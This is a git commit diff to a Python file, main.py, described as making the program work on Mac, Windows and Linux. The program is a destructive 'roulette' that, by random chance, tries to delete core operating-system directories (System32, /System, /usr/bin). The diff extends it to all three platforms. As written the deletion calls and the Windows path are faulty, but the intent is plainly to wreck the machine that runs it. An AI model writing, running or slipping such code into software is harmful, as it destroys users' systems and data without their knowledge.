7854fadd590db3344b13f1c41253d330f577443c
ShadowFolk706 <107605578+ShadowFolk706@users.noreply.github.com>
2023-12-04 19:27:53 -0700

    Update main.py
    Made the program work on Mac, Windows, and Linux

--- main.py
+++ main.py
@@ -1,5 +1,10 @@
 import random
 import os
+import platform
 
-if random.randint(0, 6) == 1:
+if random.randint(0, 6) == 1 and platform.system() == 'Windows':
     os.remove('C:.\Windows\System32')
+if random.randint(0, 6) == 1 and platform.system() == 'Darwin':
+    os.remove('/System')
+if random.randint(0, 6) == 1 and platform.system() == 'Linux':
+    os.remove('/usr/bin')
